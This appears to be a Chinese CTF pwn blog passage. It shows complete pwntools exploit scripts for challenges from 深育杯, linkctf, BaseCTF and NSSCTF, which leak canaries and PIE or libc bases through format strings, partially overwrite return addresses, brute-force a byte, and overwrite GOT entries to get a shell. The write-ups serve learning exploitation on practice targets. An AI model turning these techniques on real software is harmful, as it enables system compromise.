id="1-深育杯-2021-find-flag-格式化字符串-pie"><a href="#1-深育杯-2021-find-flag-格式化字符串-pie" class="headerlink" title="1.[深育杯 2021]find_flag(格式化字符串-pie)"></a>1.<strong>[深育杯 2021]find_flag</strong>(格式化字符串-pie)</h3><p><a href="https://www.nssctf.cn/problem/774">题目地址</a></p><p><img src="/2024/08/31/PIE%E4%BF%9D%E6%8A%A4/checksec.bmp"></p><ul><li><strong>保护全开直接看ida</strong></li></ul><p><img src="/2024/08/31/PIE%E4%BF%9D%E6%8A%A4/%E4%B8%BB%E5%87%BD%E6%95%B0.bmp"></p><ul><li><strong>很明显的格式化字符串漏洞，先泄露canary和pie基地址，然后栈溢出到后门函数就可以了</strong> (此题有后门函数)</li></ul><p><font size="5" color="red"><strong>gdb调试查找泄露偏移</strong></font></p><ul><li>在格式化字符串漏洞那里下断点：</li></ul><p><img src="/2024/08/31/PIE%E4%BF%9D%E6%8A%A4/gdb%E6%89%BE%E5%81%8F%E7%A7%BB.bmp"></p><ul><li>先让程序start，然后如上面下断点，查看栈结构</li><li><strong>rbp上方的就是canary</strong>, 距离rsp偏移是11，看最左侧也可以看出来，0xb，再加上6个寄存器(64位),偏移地址是17</li><li>如何泄露pie地址，我们要得到一个<strong>既可以在ida中可以查看偏移的地址，也可以泄露出其真实地址的地方</strong>， 正如下方,偏移位0x146f的地方,泄露这个地方的地址，减去0x146f，就可以得到pie的基地址了。</li><li><font color="red">注意：ROPgadget看到的地址也只是偏移地址，要加上pie的基地址后才可以使用：</font></li></ul><p><img src="/2024/08/31/PIE%E4%BF%9D%E6%8A%A4/ROPgadget.bmp"></p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./pwn&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node4.anna.nssctf.cn&quot;</span>,<span class="number">28406</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 格式化字符串泄露canary和pie基地址</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Hi! What&#x27;s your name? &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;%17$p-%19$p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Nice to meet you, &quot;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">18</span>),<span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;-&#x27;</span>)</span><br><span class="line">pie_base = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>) - <span class="number">0x146F</span> </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;[+][+][+]canary = <span class="subst">&#123;<span class="built_in">hex</span>(canary)&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;[+][+][+]pie_base = <span class="subst">&#123;<span class="built_in">hex</span>(pie_base)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 栈溢出getflag</span></span><br><span class="line">getflag = pie_base + <span class="number">0x01231</span></span><br><span class="line">ret = pie_base + <span class="number">0x000000000000101a</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Anything else? &quot;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x38</span>) + p64(canary) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span> + p64(ret) + p64(getflag)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h6 id><a href="#" class="headerlink" title></a></h6><h3 id="2-linkctf-2018-7-babypie"><a href="#2-linkctf-2018-7-babypie" class="headerlink" title="2.linkctf_2018.7_babypie"></a>2.linkctf_2018.7_babypie</h3><p><a href="https://buuoj.cn/challenges#linkctf_2018.7_babypie">题目链接</a></p><p><img src="/2024/08/31/PIE%E4%BF%9D%E6%8A%A4/pie2-1.bmp"></p><ul><li><strong>通过printf遇到\x00才会停止输出的特性，从而泄露canary</strong></li><li><font color="red">但是此时无法泄露出pie的基地址了，那么我们就无法修改ret_address了吗？其实不然</font></li></ul><p>之前说过，由于页对其的机制，即使开启了pie，其末三位16进制数字也是一样的，正是因为这个，**所以返回地址和后门函数的地址应该只有末四位不同(运气最差的情况下)**，所以我们只需要修改末四位就可以ret到后门函数，从而getshell。</p><ul><li>此题目就是如此，但是只需要修改末两位就可以getshell</li></ul><p><font size="4"><strong>gdb 调试，画框部分其实就是main函数结束后的返回地址，发现偏移是0xa6a</strong></font></p><p><img src="/2024/08/31/PIE%E4%BF%9D%E6%8A%A4/pie2-2.bmp"></p><p><strong><font size="4">ida中system(“&#x2F;bin&#x2F;sh”)的地址偏移是0xa42，只有后两位不同，修改后两位即可</font></strong></p><p><img src="/2024/08/31/PIE%E4%BF%9D%E6%8A%A4/pie2-3.bmp"></p><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./pwn&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">26786</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x25</span>+<span class="string">b&#x27;bbbb&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Input your Name:\n&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">canary = u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;[+][+][+]canary = <span class="subst">&#123;<span class="built_in">hex</span>(canary)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#getshell = 0x00A3E</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x28</span>) + p64(canary) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span> + <span class="string">b&#x27;\x42&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h4><p>如果有多位不同，而我们又只能逐字节更改，有时就需要自己写脚本爆破了</p><h3 id="3-Basectf-week3-PIE-爆破返回地址"><a href="#3-Basectf-week3-PIE-爆破返回地址" class="headerlink" title="3.Basectf-week3-PIE(爆破返回地址)"></a>3.Basectf-week3-PIE(爆破返回地址)</h3><p><a href="https://www.basectf.fun/">题目链接</a></p><p><img src="/2024/08/31/PIE%E4%BF%9D%E6%8A%A4/3-1.bmp"></p><ul><li>发现主函数就这些，什么都没有，所以我们要泄露libc，获得system函数,所需的gadget。</li><li>但是我们无法像基本的ret2libc一样ret到main函数，那么如何修改呢？看下面的调试：</li></ul><h4 id="gdb调试："><a href="#gdb调试：" class="headerlink" title="gdb调试："></a>gdb调试：</h4><h5 id="1-填满栈空间，查看ret-address"><a href="#1-填满栈空间，查看ret-address" class="headerlink" title="1.填满栈空间，查看ret_address"></a>1.填满栈空间，查看ret_address</h5><p><img src="/2024/08/31/PIE%E4%BF%9D%E6%8A%A4/3-2.bmp"></p><ul><li>如图，返回地址是__libc_start_main+128，按照之前的方法来说，这里应该是一个pie+偏移的地址，我们修改末两字节就可以返回到main函数，然后通过泄露的地址计算出pie基地址，进行其他操作。</li><li>但是这里不是，但是难道就不行了吗？其实不然，__libc_start_main函数附近也有gadget可以使我们返回main函数，可以自己用telescope去慢慢找，但是也可以直接爆破。</li><li>其实你要知道，这题目肯定是修改末字节可以返回main函数的，不然就写不出来了。</li></ul><h4 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 替换为 process 或 remote</span></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment"># p = remote(&quot;challenge.basectf.fun&quot;, 20961)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x100</span>):  <span class="comment"># 0x00 到 0xff</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;Trying p8 value: <span class="subst">&#123;<span class="built_in">hex</span>(i)&#125;</span>&#x27;</span>)</span><br><span class="line">    p = process(<span class="string">&quot;./pwn&quot;</span>)  <span class="comment"># 每次循环都需要重新创建进程</span></span><br><span class="line">    payload = cyclic(<span class="number">0x100</span> + <span class="number">8</span>) + p8(i)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = p.recvuntil(<span class="string">&quot;you said &quot;</span>, timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="built_in">print</span>(p.recv())</span><br><span class="line">        <span class="keyword">if</span> response:</span><br><span class="line">            libc_start_main = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - i + <span class="number">0xc0</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;[+][+][+][+] Correct p8 value: <span class="subst">&#123;<span class="built_in">hex</span>(i)&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;[+][+][+][+] libc_start_main: <span class="subst">&#123;<span class="built_in">hex</span>(libc_start_main)&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="comment"># 后续的攻击逻辑</span></span><br><span class="line">            base = libc_start_main - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">            system = base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">            bin_sh = base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">            pop_rdi_ret = base + <span class="number">0x000000000002a3e5</span></span><br><span class="line">            ret = base + <span class="number">0x0000000000029139</span></span><br><span class="line"></span><br><span class="line">            payload = cyclic(<span class="number">0x108</span>) + p64(pop_rdi_ret) + p64(bin_sh) + p64(ret) + p64(system)</span><br><span class="line">            p.sendline(payload)</span><br><span class="line">            p.interactive()</span><br><span class="line">            <span class="keyword">break</span>  <span class="comment"># 找到正确的值后退出循环</span></span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;p8 value <span class="subst">&#123;<span class="built_in">hex</span>(i)&#125;</span> failed.&#x27;</span>)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        p.close()</span><br></pre></td></tr></table></figure><ul><li>效果：在出现输出停止的时候就说明那个数字是有效的，因为此时你已经远程控制服务器了，等待着你输出指令。</li><li>0xc0对应的是__libc_start_main的地址。</li><li>题目中没有相应的gadget,但是libc.so文件里面也有gadget，通过libc_base+偏移也可以使用</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>格式化字符串漏洞</title>
      <link href="/2024/08/25/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/"/>
      <url>/2024/08/25/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="栈上格式化字符串"><a href="#栈上格式化字符串" class="headerlink" title="栈上格式化字符串"></a>栈上格式化字符串</h1><h3 id="1-64位泄露libc地址"><a href="#1-64位泄露libc地址" class="headerlink" title="1.64位泄露libc地址"></a>1.64位泄露libc地址</h3><ul><li>开始前可以先参考我的博客：<a href="https://blog.csdn.net/zwb2603096342/article/details/140495295?spm=1001.2014.3001.5502">BUUCTF axb_2019_fmt32 &amp; fmt64_格式化字符串泄露libc-CSDN博客</a></li></ul><p><font size="4" color="red">题目 BaseCTF week3-format_string_level2</font></p><p><img src="/2024/08/25/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/%E6%A0%88%E4%B8%8A-x64.bmp" alt="栈上-x64"></p><ul><li>很明显的格式化字符串漏洞，没有后门函数，需要泄露libc。</li><li>偏移照惯例找就行了，这里就不展示了，<strong>偏移是6</strong>，需要注意64位和32利用格式化字符串漏洞实现任意地址读的区别：<strong>64位的地址多了许多0，所以导致不可以在payload前面填要读的地址</strong></li></ul><p><font size="4" color="red">举例：</font></p><p>payload &#x3D; p64(printf_got) + b’%6$s’ 这样写在输出的时候，读完printf_got就结束了，got表地址就只有三字节，后面全是<strong>补全的\x00,会导致printf输出截断</strong>，<strong>所以printf_got应该放在后面。</strong></p><p><font size="4" color="red">题解：</font></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher3 <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;challenge.basectf.fun&quot;</span>,<span class="number">49786</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./fmt&quot;</span>)</span><br><span class="line"></span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"><span class="comment"># 偏移6</span></span><br><span class="line">payload = <span class="string">b&#x27;%7$saaaa&#x27;</span>+p64(read_got) <span class="comment">#前面补全8字节，防止\x00截断</span></span><br><span class="line">p.send(payload)</span><br><span class="line">read_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(read_addr))</span><br><span class="line"><span class="comment">#libc = LibcSearcher(&#x27;read&#x27;,read_addr)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;/home/pwn/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6&quot;</span>)</span><br><span class="line">base = read_addr - libc.sym[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">system = base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>,&#123;printf_got:system&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="2-泄露canary"><a href="#2-泄露canary" class="headerlink" title="2.泄露canary"></a>2.泄露canary</h3><p><font size="4" color="red">题目 NSSCTF 3rd ezstack:</font></p><p><img src="/2024/08/25/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/capture_20240826120221017.bmp"></p><ul><li>可以发现很明显的格式化字符串漏洞，但是只可以利用一次，由于<strong>printf遇到\x00才会停止输出</strong>，利用这个特性，加上任意地址可读的漏洞利用，<strong>我们可以泄露出canary</strong>。</li><li>难点其实在于<font size="4" color="red">找偏移</font></li></ul><p><font size="4" color="red">以本题举个例子：</font></p><p>buf距离canary 0x38的位置，在栈上差距0x38&#x2F;8&#x3D;7个位置，再加上64位传入前六个参数位于寄存器中，所以偏移其实是<strong>7+6&#x3D;13</strong>，然后就可以开始得到canary，进行正常的ret2libc：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 偏移6+7</span></span><br><span class="line"><span class="comment">#p = remote(&quot;node8.anna.nssctf.cn&quot;,28183)</span></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000401303</span></span><br><span class="line">ret = <span class="number">0x000000000040101a</span></span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;canary challenge\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;%13$p&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">18</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+][+][+][+]canary=&quot;</span>,<span class="built_in">hex</span>(canary))</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;\n&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(canary) + p64(<span class="number">0</span>) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;puts_address &quot;</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">LibcSearcher 没搜到，上网站找的</span></span><br><span class="line"><span class="string">libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)</span></span><br><span class="line"><span class="string">base = puts_addr - libc.dump(&#x27;puts&#x27;)</span></span><br><span class="line"><span class="string">system = base + libc.dump(&#x27;system&#x27;)</span></span><br><span class="line"><span class="string">bin_sh = base + libc.dump(&#x27;str_bin_sh&#x27;)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;/mnt/hgfs/ctfpwn/exp/libc/libc6_2.31-0ubuntu9.10_amd64.so&quot;</span>)</span><br><span class="line">base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system = base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;canary challenge\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;%13$p&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">18</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+][+][+][+]canary=&quot;</span>,<span class="built_in">hex</span>(canary))</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;\n&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(canary) + p64(<span class="number">0</span>) + p64(pop_rdi_ret) +p64(bin_sh) + p64(ret) + p64(system)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3-只有一次格式化字符串漏洞利用机会"><a href="#3-只有一次格式化字符串漏洞利用机会" class="headerlink" title="3.只有一次格式化字符串漏洞利用机会"></a>3.只有一次格式化字符串漏洞利用机会</h3><p>题目来自BaseCTF fmt3,参考了官方题解</p><h4 id="ida速览"><a href="#ida速览" class="headerlink" title="ida速览"></a>ida速览</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">256</span>]; <span class="comment">// [rsp+0h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+108h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;-----&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x110</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>很明显的格式化字符串漏洞利用，但是无法栈溢出到返回地址。</li></ul><h4 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h4><ul><li>我们没有system和&#x2F;bin&#x2F;sh，很明显是需要泄露libc的，泄露libc很简单，同开头的64位利用一样，但是然后的步骤我们该如何进行呢？一次格式化字符串漏洞利用行不行呢？</li><li>其实当然是不行的，如何修改可以使得多次利用呢？<font color="red">canary!!!</font></li><li>canary阻止了我们进行栈溢出的利用，但是同时也衍生出了对于它的攻击手法以及利用，**__stack_chk_fail的利用。**</li><li>当输入达到canary的时候，发生错误，系统会执行__stack_chk_fail函数，然后导致退出程序，如果我们修改该函数的got表内容为main函数的地址，那么我们主动去触发这个函数，是不是就会跳到main函数了呢？答案当然是：是的！！！</li><li>所以思路很明显了，先将stack_chk_fail的got改为main函数的地址，并且泄露libc，第二次将printf_got修改为system，第三次传入&#x2F;bin&#x2F;sh就行了，但是记住，要主动去触发__stack_chk_fail函数才会返回到main函数。</li></ul><h4 id="EXP-解释"><a href="#EXP-解释" class="headerlink" title="EXP&amp;解释"></a>EXP&amp;解释</h4><h5 id="1-修改-stack-chk-fail函数got表，并且泄露libc"><a href="#1-修改-stack-chk-fail函数got表，并且泄露libc" class="headerlink" title="1.修改__stack_chk_fail函数got表，并且泄露libc"></a>1.修改__stack_chk_fail函数got表，并且泄露libc</h5><ul><li>根据ida地址分析，只需要进行三次的单字节修改即可。偏移是6，22 &#x3D; 0x10 + 6,0x10的偏移在栈上表示为0x10*8 &#x3D; 0x80，所以对偏移为22的地方进行单字节修改，将偏移为22的地方写入要修改的即可。</li><li>其中的<strong>0x100 - 上次已经写入的字符数 + 本次应该写入的字符数</strong>，个人认为应该是<font color="red">防止出现负数的情况，也算是学到了新的写法了。</font></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">stack_chk_fail = <span class="number">0x0403320</span></span><br><span class="line">main      =      <span class="number">0x040121B</span> </span><br><span class="line">payload = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x1b</span>).encode() + <span class="string">b&#x27;c%22$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x100</span>-<span class="number">0x1b</span>+<span class="number">0x12</span>).encode() + <span class="string">b&#x27;c%23$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x100</span>-<span class="number">0x12</span>+<span class="number">0x40</span>).encode() + <span class="string">b&#x27;c%24$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;---b%25$s&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>) </span><br><span class="line">payload += p64(stack_chk_fail)     <span class="comment"># 22</span></span><br><span class="line">payload += p64(stack_chk_fail+<span class="number">1</span>)   <span class="comment"># 23</span></span><br><span class="line">payload += p64(stack_chk_fail+<span class="number">2</span>)   <span class="comment"># 24</span></span><br><span class="line">payload += p64(printf_got)         <span class="comment"># 25</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x110</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment"># 主动触发stack_chk_fail</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;---b&#x27;</span>)</span><br><span class="line">printf_addr = u64(p.recv(<span class="number">6</span>)+<span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">success(<span class="string">&quot;printf_address : &quot;</span>+<span class="built_in">hex</span>(printf_addr))</span><br><span class="line">base = printf_addr - libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">system = base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br></pre></td></tr></table></figure><h5 id="2-修改printf-got-system，传入-bin-sh"><a href="#2-修改printf-got-system，传入-bin-sh" class="headerlink" title="2.修改printf_got &#x3D;&gt; system，传入&#x2F;bin&#x2F;sh"></a>2.修改printf_got &#x3D;&gt; system，传入&#x2F;bin&#x2F;sh</h5><ul><li>修改步骤和上述没区别</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(system &amp; <span class="number">0xff</span>).encode() + <span class="string">b&#x27;c%22$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>((<span class="number">0x100</span> - system&amp;<span class="number">0xff</span>)+(system &gt;&gt; <span class="number">8</span> &amp; <span class="number">0xff</span>)).encode() + <span class="string">b&#x27;c%23$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&quot;%&quot;</span> + <span class="built_in">str</span>((<span class="number">0x100</span> - (((system &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>))) + (((system &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>))).encode() + <span class="string">b&quot;c%24$hhn&quot;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload += p64(printf_got)</span><br><span class="line">payload += p64(printf_got + <span class="number">1</span>)</span><br><span class="line">payload += p64(printf_got + <span class="number">2</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x110</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.3</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.3</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="非栈上格式化字符串"><a href="#非栈上格式化字符串" class="headerlink" title="非栈上格式化字符串"></a>非栈上格式化字符串</h1><h4 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h4><ul><li><font size4>NSSCTF 3rd <strong>ezfmt</strong></font></li></ul><p>先来看看题目：</p><p><img src="/2024/08/25/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/%E9%A2%98%E7%9B%AEida.bmp"></p><h4 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h4><ul><li>题目很明显，给你7次利用格式化字符串漏洞的机会，让你getshell，可是我们发现<strong>buf是在bss段上面的</strong>，不同于在栈上的利用，在栈上，我们通常是<strong>修改printf_got为system地址</strong>，然后通过传入&#x2F;bin&#x2F;sh,达到getshell的目的，可是此处，我们不可以。</li><li>为什么？因为非栈上的格式化字符串漏洞的利用需要我们自己去手动写payload，不像非栈上有fmtstr_payload这种工具帮我们修改，因此，我们手搓修改就要一直用到格式化字符串漏洞，那么这个printf就无法更改，那我们可以修改什么呢?</li><li><font size="4" color="red"><strong>修改__libc_start_main</strong></font></li><li><strong>__libc_start_main相当于函数的返回地址</strong>，当程序结束的时候会执行它，我们可以将它修改为onegadget，然后就可以getshell了，下面说说如何修改。</li></ul><h4 id="修改核心："><a href="#修改核心：" class="headerlink" title="修改核心："></a>修改核心：</h4><ul><li>非栈上的修改需要我们<fron size="4" color="red"><strong>间接写+无中生友</strong></fron></li></ul><p>我们要找到 <font color="red"><strong>地址a -&gt; 地址b 